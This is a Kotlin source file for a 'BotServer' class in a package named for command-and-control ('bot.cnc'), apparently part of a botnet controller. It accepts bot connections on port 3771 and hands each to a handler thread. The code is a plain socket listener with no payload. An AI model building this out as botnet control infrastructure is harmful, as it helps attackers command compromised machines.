package xyz.terrific.server.bot.cnc

import java.io.IOException
import java.net.ServerSocket

/**
 * @author TerrificTable55
 * @version 1.0
 */
class BotServer
    /**
     * @param socket sets private socket
     */
    (private val socket: ServerSocket?) {

    /**
     * @use Starts the bot server
     */
    fun start() {
        try {
            while (!socket!!.isClosed) {
                val conn = socket.accept()
                System.out.printf(" [ BOT | %s ] Connected\n", conn.remoteSocketAddress.toString())
                val handler = BotHandler(conn)
                val thread = Thread(handler)
                thread.start()
            }
        } catch (e: Exception) {
            e.printStackTrace()
        }
    }

    /**
     * @use closes socket
     */
    fun close() {
        try {
            socket?.close()
        } catch (e: Exception) {
            e.printStackTrace()
        }
    }

    companion object {
        /**
         * @use Init function, creates a new ServerSocket and defines a new BotServer
         * @throws IOException
         */
        @Throws(IOException::class)
        fun init() {
            val bSocket = ServerSocket(3771)
            val server = BotServer(bSocket)
            server.start()
        }
    }
}
